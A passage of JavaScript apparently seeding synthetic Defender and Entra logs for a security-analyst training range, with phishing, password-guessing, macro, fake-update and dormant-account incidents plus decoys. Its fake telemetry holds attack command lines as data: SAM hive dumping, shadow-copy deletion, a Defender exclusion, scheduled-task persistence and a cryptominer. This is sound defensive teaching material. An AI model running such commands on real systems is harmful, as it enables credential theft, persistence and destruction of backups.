    //   GRAYRABBIT story so far, avoiding the busier devices). ----------
    const hgBase = iso(3.5); // ~3h30m ago
    DeviceProcessEvents.push({
      Timestamp: hgBase, DeviceName: 'FAB-MKT-02', ActionType: 'ProcessCreated',
      FileName: 'winappx.exe', FolderPath: 'C:\\Users\\All Users\\MicrosoftDistribution\\sysmain',
      SHA1: hex(mulberry32(6900), 40), ProcessId: 7744,
      ProcessCommandLine: 'winappx.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'mrivera',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'mrivera',
    });
    // Decoy: the SAME filename, winappx.exe, but a differently-pathed, legitimate installed copy — the
    // same "same filename, real vs. fake location" decoy shape this range has used repeatedly (s35, s40,
    // s46) — running from a genuine Program Files install, on the existing device FAB-ENG-01 under the
    // account this range has consistently reused for "here's what a real, legitimately-installed copy of
    // this tool looks like" contrasts (tnowak, already used the same way for the Incident F/s28 and
    // Incident X/s46 decoys). A naive `FileName == "winappx.exe"` sweep over-matches to both rows; only
    // the folder-path filter isolates the real incident to exactly 1.
    DeviceProcessEvents.push({
      Timestamp: iso(41), DeviceName: 'FAB-ENG-01', ActionType: 'ProcessCreated',
      FileName: 'winappx.exe', FolderPath: 'C:\\Program Files\\WinAppX',
      SHA1: hex(mulberry32(6901), 40), ProcessId: 5223,
      ProcessCommandLine: 'winappx.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'tnowak',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'tnowak',
    });

    // =====================================================================================================
    // Beginner Fundamentals batch (5 new missions, this round): reading-heavy, query-light — each one is
    // deliberately a single `where` (at most one extra `and`) or one `summarize...by`, with the depth living
    // in the mission prose/hints instead of query complexity. No new DEVICES entry added anywhere below
    // (would shift DEVICES.length and silently change s9's seeded-RNG busiest-device answer, fab-fin-04/48
    // — confirmed by re-reading DEVICES before writing any of this), no ThreatTypes of "Phish"/"Spam" used
    // on any new EmailEvents row (load-bearing for s2 and s29's exact row counts — confirmed by re-reading
    // both scenarios first), and GROUND_TRUTH.officeToPowerShell (Incident A, FAB-FIN-07/kwalters) is left
    // completely untouched.
    // =====================================================================================================

    // ---------- Incident Z: display-name-spoofed phishing link (T1566.002) — FAB-ENG-03 / dkoval ----------
    // MITRE ATT&CK T1566.002 (Phishing: Spearphishing Link, attack.mitre.org/techniques/T1566/002/),
    // verified directly against that page before writing this: a link delivered by email — not an
    // attachment, that's T1566.001 (already used in Incident A/alert-a0) — meant to get the victim to click
    // through to a credential-harvesting page. This range has no DeviceNetworkEvents row for the click
    // itself (that would need the victim to actually browse to it, which isn't modeled), so what's graded
    // is the one signal a beginner analyst can read straight out of the email headers: a sender DISPLAY
    // NAME built to look like a trusted internal source ("IT Service Desk") sent from a SENDING DOMAIN that
    // only looks like Fabrikam's real domain at a glance — fabrikan-support.example, an "m"-to-"n" typosquat
    // of fabrikam.example. This mail was not caught by any mail-flow rule — ThreatTypes is left '' (never
    // 'Phish'/'Spam' on a new row, per the note above) — which is realistic and is itself the lesson:
    // display-name spoofing routinely sails past automated filters because the FROM header is technically
    // valid mail, just from an attacker-registered look-alike domain, so a human has to actually read
    // SenderFromDomain, not just the display name, to catch it.
    const zBase = iso(14); // ~14 hours ago
    const zNetId = hex(mulberry32(7000), 32);
    EmailEvents.push({
      Timestamp: zBase, NetworkMessageId: zNetId,
      SenderFromAddress: 'helpdesk@fabrikan-support.example', SenderDisplayName: 'IT Service Desk',
      SenderFromDomain: 'fabrikan-support.example', SenderIPv4: '192.0.2.77',
      RecipientEmailAddress: 'dkoval@fabrikam.example', Subject: 'Action required: verify your account password',
      DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox/Folder',
      ThreatTypes: '', DetectionMethods: '', AttachmentCount: 0, UrlCount: 1,
    });
    // Decoy: the SAME display name, "IT Service Desk," sent to a different employee (agomez) — but from
    // the REAL fabrikam.example domain. A naive `SenderDisplayName == "IT Service Desk"` sweep over-matches
    // to both rows; only checking SenderFromDomain against the real domain separates the genuine internal
    // IT notice from the spoofed one. This is the whole lesson this mission is built to teach: never trust
    // the display name alone.
    EmailEvents.push({
      Timestamp: new Date(zBase.getTime() + 95 * 60000), NetworkMessageId: hex(mulberry32(7001), 32),
      SenderFromAddress: 'helpdesk@fabrikam.example', SenderDisplayName: 'IT Service Desk',
      SenderFromDomain: 'fabrikam.example', SenderIPv4: '20.112.77.31',
      RecipientEmailAddress: 'agomez@fabrikam.example', Subject: 'Scheduled password expiration notice',
      DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox/Folder',
      ThreatTypes: '', DetectionMethods: '', AttachmentCount: 0, UrlCount: 1,
    });

    // ---------- Incident AA: password guessing, one IP against one account, no success (T1110.001) —
    // FAB-FIN-11 / rpatel ----------
    // MITRE ATT&CK T1110.001 (Brute Force: Password Guessing, attack.mitre.org/techniques/T1110/001/),
    // verified directly against that page: repeated login attempts against ONE account, cycling through
    // guessed passwords — as opposed to T1110.003 Password Spraying (few passwords tried across MANY
    // accounts from one source, to stay under per-account lockout thresholds; modeled as Incident I/s31,
    // SPRAY_IP against jsmith/agomez/mrivera/cwoo/rpatel/qatest01) or T1110.004 Credential Stuffing
    // (previously-breached, already-valid credentials, so the failure burst is followed by an eventual
    // SUCCESS from the same source; modeled as s23, ohansen/192.0.2.187). This incident is the "plain"
    // case this mission is built to teach: one account, one attacker IP, a double-digit run of failures,
    // and NO success anywhere in the burst — the account never got in, because the attacker never actually
    // had the right password. They were guessing.
    //
    // Regression note (caught by this round's own Node-harness regression sweep, not assumed safe): s23
    // and s27-step1's ORIGINAL solutionQuery was `where ResultType=="50126" | summarize Failures=count()
    // by UserPrincipalName, IPAddress | where Failures >= 5` — a burst-size check only, with no check that
    // the burst was actually followed by a success. That's a latent gap in a query that was always
    // presented, in its own prompt/dispositionWhy, as detecting a burst-THEN-success pattern specifically.
    // This new incident's 13-failure, zero-success burst legitimately satisfies "Failures >= 5" too, so it
    // now surfaces that gap: s23/s27-step1 would return 2 rows instead of 1 without a fix. Rather than
    // avoid the collision by picking a smaller failure count (which would undercut THIS mission's own
    // "double-digit run of failures" design), s23 and s27-step1 were both fixed to actually check for the
    // trailing success (join against ResultType=="0" on the same user+IP, keep only SuccessTime >
    // LastFailure) — which is a strictly more correct implementation of what those two were always claiming
    // to test, not a workaround. Re-verified via the same Node harness: s23/s27-step1 are back to exactly
    // 1 row (ohansen), and this incident's rpatel burst is correctly excluded (no success row exists for
    // rpatel from this IP, so the inner join drops it).
    const AA_ATTACKER_IP = '203.0.113.66';
    const aaBase = iso(9); // ~9 hours ago
    for (let i = 0; i < 13; i++) {
      SigninLogs.push({
        TimeGenerated: new Date(aaBase.getTime() + i * 40000), Id: hex(mulberry32(7100 + i), 32),
        UserPrincipalName: 'rpatel@fabrikam.example', UserDisplayName: 'rpatel', UserId: hex(mulberry32(7150), 16), UserType: 'member',
        AppDisplayName: 'Office 365 Exchange Online', IPAddress: AA_ATTACKER_IP, Location: 'US',
        ResultType: '50126', ResultDescription: 'Error validating credentials due to invalid username or password.',
        ConditionalAccessStatus: 'failure', IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
        ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication',
        CorrelationId: hex(mulberry32(7160 + i), 32),
      });
    }
    // Decoy: a different account (jsmith) has a handful of failed sign-ins — everybody fat-fingers a
    // password now and then — but only 3, and the 4th attempt succeeds. A naive `ResultType == "50126"`
    // sweep with no threshold catches this too; only counting failures per account/IP and applying a real
    // burst threshold (5+, the same one s23 already established) separates a normal mistyped password from
    // an actual guessing attack. SigninLogs rows only — never DeviceProcessEvents — so this can't touch
    // FAB-FIN-04's process-event count and can't affect s9's answer either way.
    const aaDecoyBase = iso(30);
    for (let i = 0; i < 3; i++) {
      SigninLogs.push({
        TimeGenerated: new Date(aaDecoyBase.getTime() + i * 60000), Id: hex(mulberry32(7170 + i), 32),
        UserPrincipalName: 'jsmith@fabrikam.example', UserDisplayName: 'jsmith', UserId: hex(mulberry32(7180), 16), UserType: 'member',
        AppDisplayName: 'Office 365 Exchange Online', IPAddress: '20.115.62.14', Location: 'US',
        ResultType: '50126', ResultDescription: 'Error validating credentials due to invalid username or password.',
        ConditionalAccessStatus: 'failure', IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
        ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication',
        CorrelationId: hex(mulberry32(7190 + i), 32),
      });
    }
    SigninLogs.push({
      TimeGenerated: new Date(aaDecoyBase.getTime() + 3 * 60000), Id: hex(mulberry32(7195), 32),
      UserPrincipalName: 'jsmith@fabrikam.example', UserDisplayName: 'jsmith', UserId: hex(mulberry32(7180), 16), UserType: 'member',
      AppDisplayName: 'Office 365 Exchange Online', IPAddress: '20.115.62.14', Location: 'US',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication',
      CorrelationId: hex(mulberry32(7196), 32),
    });

    // ---------- Incident BB: macro-enabled invoice spreadsheet spawns cmd.exe (T1204.002) — FAB-ENG-08 /
    // ssingh ----------
    // MITRE ATT&CK T1204.002 (User Execution: Malicious File, attack.mitre.org/techniques/T1204/002/),
    // verified directly against that page: the adversary doesn't need an exploit, just a user who opens
    // the file and enables content. Deliberately placed on a DIFFERENT device AND timestamp than the
    // Detection Lab's officeToPowerShell ground truth (Incident A, FAB-FIN-07/kwalters — confirmed against
    // the live GROUND_TRUTH object before writing this; that ground truth is left completely untouched).
    // Same idea (an Office app parenting a command interpreter it should never parent), different victim
    // and a different payload (cmd.exe, not powershell.exe), so a beginner learns the general pattern
    // without this mission colliding with, or being confused for, the existing Detection Lab target.
    const bbBase = iso(26); // ~26 hours ago
    DeviceFileEvents.push({
      Timestamp: bbBase, DeviceName: 'FAB-ENG-08', ActionType: 'FileCreated',
      FileName: 'Invoice_9873.xlsm', FolderPath: 'C:\\Users\\ssingh\\Downloads',
      SHA1: hex(mulberry32(7200), 40), FileSize: 71406,
      InitiatingProcessFileName: 'OUTLOOK.EXE', InitiatingProcessAccountName: 'ssingh',
    });
    DeviceProcessEvents.push({
      Timestamp: new Date(bbBase.getTime() + 4 * 60000), DeviceName: 'FAB-ENG-08', ActionType: 'ProcessCreated',
      FileName: 'cmd.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(7201), 40), ProcessId: 7734,
      ProcessCommandLine: 'cmd.exe /c whoami',
      AccountDomain: 'FABRIKAM', AccountName: 'ssingh',
      InitiatingProcessFileName: 'EXCEL.EXE', InitiatingProcessAccountName: 'ssingh',
      InitiatingProcessCommandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /n "C:\\Users\\ssingh\\Downloads\\Invoice_9873.xlsm"',
    });
    // Decoy: cmd.exe launched the ordinary way — directly by the user, via explorer.exe (Start Menu / Run
    // dialog), never by an Office application. A naive `FileName == "cmd.exe"` sweep over-matches to both
    // rows; only checking WHO launched it (InitiatingProcessFileName) tells a routine command-prompt open
    // apart from a macro spawning a shell.
    DeviceProcessEvents.push({
      Timestamp: iso(52), DeviceName: 'FAB-HR-05', ActionType: 'ProcessCreated',
      FileName: 'cmd.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(7202), 40), ProcessId: 4410,
      ProcessCommandLine: 'cmd.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'lchen',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'lchen',
    });

    // ---------- Incident CC: fake "browser update" leads to a user-run installer (T1189) — FAB-EXEC-01 /
    // cwoo ----------
    // MITRE ATT&CK T1189 (Drive-by Compromise, attack.mitre.org/techniques/T1189/): a user browses to a
    // legitimate-but-compromised or malvertised page and the page itself — no email involved — talks the
    // visitor into downloading and running something. Deliberately grounded in the real, MITRE-documented
    // SocGholish pattern (Software S1124, attack.mitre.org/software/S1124/, verified directly against that
    // page before writing this): a fake "your browser is out of date" pop-up on an otherwise ordinary page,
    // getting the visitor to download and run a fake updater themselves. Browsing alone is the entry point
    // — there is no DeviceNetworkEvents row for the compromised page itself, since this range has no way to
    // tell "browsed to a normal site" apart from "browsed to a normal site that happened to be serving
    // injected fake-update JS" at the network-log level; rather than invent a signal it can't honestly
    // distinguish, that's left as prompt-only background, the same conservative, disclosed choice this
    // range has made whenever a real mechanism doesn't map cleanly onto a table it implements (e.g. Incident
    // Y's Telegram-bot-API C2 channel). What IS modeled and graded is the one signal actually left behind on
    // the endpoint: the fake updater the user downloaded and ran themselves, from their own Downloads
    // folder — never from a real installed application's path.
    const ccBase = iso(17); // ~17 hours ago
    DeviceProcessEvents.push({
      Timestamp: ccBase, DeviceName: 'FAB-EXEC-01', ActionType: 'ProcessCreated',
      FileName: 'Chrome_Update_Setup.exe', FolderPath: 'C:\\Users\\cwoo\\Downloads',
      SHA1: hex(mulberry32(7300), 40), ProcessId: 8821,
      ProcessCommandLine: 'Chrome_Update_Setup.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'cwoo',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'cwoo',
    });
    // Decoy: the SAME kind of filename — a Chrome updater — but the real, legitimately-installed copy,
    // running from its real Program Files path, the same convention BENIGN_PROCS already uses for
    // chrome.exe itself. A naive `FileName has "update"` sweep over-matches to both rows; only checking
    // FolderPath (a real install path vs. a user's own Downloads folder) tells the genuine background
    // updater apart from the one the user was tricked into running. (This decoy filename is deliberately
    // underscore-delimited — Chrome_Update.exe, not camelCase "ChromeUpdate.exe" — so it actually tokenizes
    // into separate "chrome"/"update"/"exe" terms and matches a `has "update"` filter; confirmed against
    // this engine's isTermMatch()/whole-term-match behavior before choosing this name, so the intended
    // "naive filter over-matches to 2 rows" teaching point isn't silently defeated.)
    DeviceProcessEvents.push({
      Timestamp: iso(60), DeviceName: 'FAB-HR-02', ActionType: 'ProcessCreated',
      FileName: 'Chrome_Update.exe', FolderPath: 'C:\\Program Files\\Google\\Chrome\\Application',
      SHA1: hex(mulberry32(7301), 40), ProcessId: 3390,
      ProcessCommandLine: 'Chrome_Update.exe /silent',
      AccountDomain: 'FABRIKAM', AccountName: 'agomez',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'agomez',
    });

    // ---------- Incident DD: sign-in on a long-departed employee's account (T1078) — no associated device
    // ----------
    // MITRE ATT&CK T1078 (Valid Accounts, attack.mitre.org/techniques/T1078/), verified directly against
    // that page: the first mission in this range to teach T1078 as a first-principles concept on its own
    // (it already appears bundled into s31/Incident I's multi-step spray+persistence chain as T1078.004,
    // but never taught by itself). T1078 is ATT&CK's broadest technique by tactic coverage, mapped to FOUR
    // tactics at once — Initial Access, Persistence, Privilege Escalation, and Stealth (the April
    // 2026-renamed former Defense Evasion) — because one valid, working credential can be used to get in,
    // to stay in, to act with more privilege than the attacker should have, and to blend in as ordinary
    // traffic, all with the same login. Rather than reuse an existing employee, this needed a genuinely
    // departed identity: every one of the 11 regular DEVICES-array employees already accumulates roughly
    // 15 rows of background SigninLogs noise each from the 170-row noise loop above (confirmed by reading
    // that loop before writing this, not assumed), which would bury this mission's one clean signal under
    // over a dozen unrelated rows and break its "the whole answer is one row" design. So this follows the
    // SAME precedent this range already set with qatest01 (Incident I): a minor identity added to
    // ENTRA_USERS AFTER the noise loop runs, so it accumulates zero background noise and appears in
    // SigninLogs exactly once — the incident itself.
    ENTRA_USERS.push({ upn: 'bsanders@fabrikam.example', displayName: 'bsanders', dept: 'Finance' });
    const ddBase = iso(6); // ~6 hours ago
    SigninLogs.push({
      TimeGenerated: ddBase, Id: hex(mulberry32(7400), 32),
      UserPrincipalName: 'bsanders@fabrikam.example', UserDisplayName: 'bsanders', UserId: hex(mulberry32(7401), 16), UserType: 'member',
      AppDisplayName: 'Office 365 Exchange Online', IPAddress: '20.118.44.201', Location: 'US',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication',
      CorrelationId: hex(mulberry32(7402), 32),
    });
    // No separate malicious decoy row for this one — the surrounding hundreds of ordinary sign-ins from the
    // 11 active employees above ARE the implicit decoy: the lesson is that "successful, no errors, nothing
    // flagged as risky" isn't the same thing as "should have happened at all." Deliberately the simplest
    // query in this whole batch of 5.

    // ---------- Alerts: AlertInfo/AlertEvidence rows for each incident above, joined on AlertId — the
    // real Defender XDR advanced-hunting alert schema, so investigations can start the way they do in
    // production: from a fired alert, not a paragraph of narration ----------
    function alert(id, ts, title, category, severity, source, detection, techniques) {
      AlertInfo.push({ Timestamp: ts, AlertId: id, Title: title, Category: category, Severity: severity, ServiceSource: source, DetectionSource: detection, AttackTechniques: techniques });
    }
    function evidence(id, ts, title, techniques, source, detection, fields) {
      AlertEvidence.push(Object.assign({ Timestamp: ts, AlertId: id, Title: title, AttackTechniques: techniques, ServiceSource: source, DetectionSource: detection }, fields));
    }

    alert('alert-a0', aBase, 'Email reported as phishing by mail filtering', 'InitialAccess', 'Medium',
      'Microsoft Defender for Office 365', 'Mail filter', 'T1566.001');
    evidence('alert-a0', aBase, 'Email reported as phishing by mail filtering', 'T1566.001', 'Microsoft Defender for Office 365', 'Mail filter',
      { EntityType: 'Mailbox', EvidenceRole: 'Impacted', AccountName: 'kwalters', AccountDomain: 'FABRIKAM', EmailSubject: 'URGENT: Overdue Invoice #4471 - Action Required', NetworkMessageId: 'a1c9f0e2b3d4a5f6e7c8b9a0d1e2f3a4' });
    alert('alert-a1', new Date(aBase.getTime() + 9 * 60000), 'Suspicious encoded PowerShell command line', 'Execution', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1059.001;T1071.001');
    evidence('alert-a1', new Date(aBase.getTime() + 9 * 60000), 'Suspicious encoded PowerShell command line', 'T1059.001;T1071.001', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-FIN-07', AccountName: 'kwalters', AccountDomain: 'FABRIKAM', FileName: 'powershell.exe', FolderPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0' });
    evidence('alert-a1', new Date(aBase.getTime() + 10 * 60000), 'Suspicious encoded PowerShell command line', 'T1059.001;T1071.001', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Url', EvidenceRole: 'Related', EvidenceDirection: 'Outbound', DeviceName: 'FAB-FIN-07', RemoteUrl: 'cdn-update-delivery.net', RemoteIP: '203.0.113.55' });

    alert('alert-b1', new Date(bBase.getTime() + 7 * 45000 + 20000), 'Possible brute-force: repeated failed sign-ins then success', 'CredentialAccess', 'High',
      'Microsoft Defender for Identity', 'Identity sensor', 'T1110.001');
    evidence('alert-b1', new Date(bBase.getTime() + 7 * 45000 + 20000), 'Possible brute-force: repeated failed sign-ins then success', 'T1110.001', 'Microsoft Defender for Identity', 'Identity sensor',
      { EntityType: 'User', EvidenceRole: 'Impacted', DeviceName: 'FAB-IT-01', AccountName: 'svc_backup', AccountDomain: 'FABRIKAM', RemoteIP: '198.51.100.23' });
    alert('alert-b2', new Date(bBase.getTime() + 7 * 45000 + 150000), 'Credential dumping via registry hive save', 'CredentialAccess', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1003.002');
    evidence('alert-b2', new Date(bBase.getTime() + 7 * 45000 + 150000), 'Credential dumping via registry hive save', 'T1003.002', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-IT-01', AccountName: 'svc_backup', AccountDomain: 'FABRIKAM', FileName: 'reg.exe', ProcessCommandLine: 'reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save' });
    alert('alert-d1', new Date(bBase.getTime() + 7 * 45000 + 210000), 'Lateral movement over SMB admin share to a high-value host', 'LateralMovement', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1021.002');
    evidence('alert-d1', new Date(bBase.getTime() + 7 * 45000 + 210000), 'Lateral movement over SMB admin share to a high-value host', 'T1021.002', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Device', EvidenceRole: 'Impacted', DeviceName: 'FAB-EXEC-01', AccountName: 'svc_backup', AccountDomain: 'FABRIKAM' });

    alert('alert-c1', cBase, 'Ransomware-like mass file rename detected', 'Impact', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1486');
    evidence('alert-c1', cBase, 'Ransomware-like mass file rename detected', 'T1486', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-ENG-03', AccountName: 'dkoval', AccountDomain: 'FABRIKAM', FileName: 'svchost32.exe', ProcessCommandLine: 'svchost32.exe --encrypt-mode' });
    evidence('alert-c1', new Date(cBase.getTime() + 60000), 'Ransomware-like mass file rename detected', 'T1486', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'File', EvidenceRole: 'Impacted', DeviceName: 'FAB-ENG-03', FileName: 'design_spec.docx.locked', FolderPath: 'C:\\Users\\dkoval\\Documents\\Projects' });

    // A low-confidence heuristic alert: it fires on ANY reg.exe save regardless of hive, so it also
    // catches the legitimate Veeam backup job below — a deliberate false positive for disposition practice.
    const veeamAlertTs = iso(24 * 1 + 0.05);
    alert('alert-e1', veeamAlertTs, 'Registry hive export outside change window', 'CredentialAccess', 'Low',
      'Microsoft Defender for Endpoint', 'EDR heuristic (reg.exe save, any hive)', 'T1003.002');
    evidence('alert-e1', veeamAlertTs, 'Registry hive export outside change window', 'T1003.002', 'Microsoft Defender for Endpoint', 'EDR heuristic (reg.exe save, any hive)',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-IT-01', AccountName: 'svc_veeam', AccountDomain: 'FABRIKAM', FileName: 'reg.exe', ProcessCommandLine: 'reg.exe save HKLM\\SOFTWARE\\Veeam C:\\ProgramData\\Veeam\\config_1.reg' });

    alert('alert-p6', xmrigTs, 'Cryptomining process connected to external mining pool', 'Impact', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1496');
    evidence('alert-p6', xmrigTs, 'Cryptomining process connected to external mining pool', 'T1496', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-ENG-08', AccountName: 'ssingh', AccountDomain: 'FABRIKAM', FileName: 'xmrig.exe', ProcessCommandLine: 'xmrig.exe -o stratum+tcp://relay-pool-sync.net:4444 -u 48fakeWalletForTrainingOnly0000000000000000000000000000000000 -p x --donate-level=1' });

    alert('alert-p7', gBase, 'Spam campaign using invisible Unicode characters to evade subject-line filtering', 'InitialAccess', 'Medium',
      'Microsoft Defender for Office 365', 'Domain reputation', 'T1027.018');
    evidence('alert-p7', gBase, 'Spam campaign using invisible Unicode characters to evade subject-line filtering', 'T1027.018', 'Microsoft Defender for Office 365', 'Domain reputation',
      { EntityType: 'Mailbox', EvidenceRole: 'Impacted', AccountName: 'jsmith', AccountDomain: 'FABRIKAM', EmailSubject: 'Your business fun\u{E0020}ding offer is approved', NetworkMessageId: hex(mulberry32(800), 32) });

    alert('alert-p8', kBase, 'Print server process spawned an unexpected SYSTEM process after a known pre-auth RCE chain', 'InitialAccess', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1190');
    evidence('alert-p8', kBase, 'Print server process spawned an unexpected SYSTEM process after a known pre-auth RCE chain', 'T1190', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-IT-01', AccountName: 'SYSTEM', AccountDomain: 'NT AUTHORITY', FileName: 'charmap.exe', ProcessCommandLine: 'charmap.exe' });

    alert('alert-p9', sbBase, 'Windows Defender engine process (MsMpEng.exe) spawned a child process — no official patch exists yet for the suspected cause', 'PrivilegeEscalation', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1068');
    evidence('alert-p9', sbBase, 'Windows Defender engine process (MsMpEng.exe) spawned a child process — no official patch exists yet for the suspected cause', 'T1068', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-ENG-05', AccountName: 'SYSTEM', AccountDomain: 'NT AUTHORITY', FileName: 'calc.exe', ProcessCommandLine: 'calc.exe' });

    alert('alert-p10', lahBase, 'Process masquerading as a legitimate Windows utility (nslookup.exe), running from a non-standard folder', 'DefenseEvasion', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1036.005');
    evidence('alert-p10', lahBase, 'Process masquerading as a legitimate Windows utility (nslookup.exe), running from a non-standard folder', 'T1036.005', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-FIN-07', AccountName: 'kwalters', AccountDomain: 'FABRIKAM', FileName: 'nslookup.exe', FolderPath: 'C:\\Users\\kwalters\\AppData\\Local\\LockAppHost', ProcessCommandLine: 'nslookup.exe' });

    alert('alert-p11', scBase, 'Remote-support client process spawned a scripting interpreter', 'CommandAndControl', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1219');
    evidence('alert-p11', scBase, 'Remote-support client process spawned a scripting interpreter', 'T1219', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-FIN-11', AccountName: 'SYSTEM', AccountDomain: 'NT AUTHORITY', FileName: 'wscript.exe', ProcessCommandLine: 'wscript.exe C:\\Windows\\Temp\\1.vbs' });

    alert('alert-p12', oBase, 'Sign-in flagged by Entra ID Protection for anonymizing-proxy network use', 'CommandAndControl', 'High',
      'Microsoft Entra ID Protection', 'Identity Protection risk detection', 'T1090.002');
    evidence('alert-p12', oBase, 'Sign-in flagged by Entra ID Protection for anonymizing-proxy network use', 'T1090.002', 'Microsoft Entra ID Protection', 'Identity Protection risk detection',
      { EntityType: 'User', EvidenceRole: 'Impacted', AccountUpn: 'cwoo@fabrikam.example', RemoteIP: PROXY_IP });

    alert('alert-p13', rsBase, 'Volume Shadow Copy deletion — classic ransomware pre-encryption step', 'Impact', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1490');
    evidence('alert-p13', rsBase, 'Volume Shadow Copy deletion — classic ransomware pre-encryption step', 'T1490', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-ENG-01', AccountName: 'tnowak', AccountDomain: 'FABRIKAM', FileName: 'vssadmin.exe', ProcessCommandLine: 'vssadmin.exe Delete Shadows /all /quiet' });

    alert('alert-p14', qBase, 'Scheduled task created for recurring persistence after a suspected browser exploit chain', 'Persistence', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1053.005');
    evidence('alert-p14', qBase, 'Scheduled task created for recurring persistence after a suspected browser exploit chain', 'T1053.005', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-EXEC-01', AccountName: 'cwoo', AccountDomain: 'FABRIKAM', FileName: 'schtasks.exe', ProcessCommandLine: 'schtasks.exe /create /sc minute /mo 5 /tn "Windows Scheduled System" /tr "rundll32.exe C:\\ProgramData\\WSCUpdate\\wsc.dll,Entry" /f' });

    alert('alert-p15', grBase, 'Legitimate archiving utility running from a non-standard, user-writable folder', 'DefenseEvasion', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1574.001');
    evidence('alert-p15', grBase, 'Legitimate archiving utility running from a non-standard, user-writable folder', 'T1574.001', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-MKT-02', AccountName: 'mrivera', AccountDomain: 'FABRIKAM', FileName: '7z.exe', FolderPath: 'C:\\Users\\Public\\Documents', ProcessCommandLine: '7z.exe' });

    alert('alert-p16', tmBase, 'Task Manager created a memory dump of the LSASS process', 'CredentialAccess', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1003.001');
    evidence('alert-p16', tmBase, 'Task Manager created a memory dump of the LSASS process', 'T1003.001', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'File', EvidenceRole: 'Impacted', DeviceName: 'FAB-HR-02', AccountName: 'agomez', AccountDomain: 'FABRIKAM', FileName: 'lsass.DMP', FolderPath: 'C:\\Users\\agomez\\AppData\\Local\\Temp' });

    alert('alert-p17', gtBase, 'PowerShell added a Windows Defender exclusion for a non-standard, user-writable folder', 'DefenseEvasion', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1562.001');
    evidence('alert-p17', gtBase, 'PowerShell added a Windows Defender exclusion for a non-standard, user-writable folder', 'T1562.001', 'Microsoft Defender for Endpoint', 'EDR',
      { EntityType: 'Process', EvidenceRole: 'Impacted', DeviceName: 'FAB-MKT-06', AccountName: 'ohansen', AccountDomain: 'FABRIKAM', FileName: 'powershell.exe', ProcessCommandLine: 'powershell.exe -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\ohansen\\AppData\\Local\\GoogleAppInstaller\'"' });

    alert('alert-p18', cfBase, 'Obfuscated PowerShell spawned directly by the Run dialog (explorer.exe)', 'Execution', 'High',
      'Microsoft Defender for Endpoint', 'EDR', 'T1204.004');
    evidence('alert-p18', cfBase, 'Obfuscated PowerShell spawned directly by the Run dialog (explorer.exe)', 'T1204.004', 'Microsoft Defender for Endpoint', 'EDR',
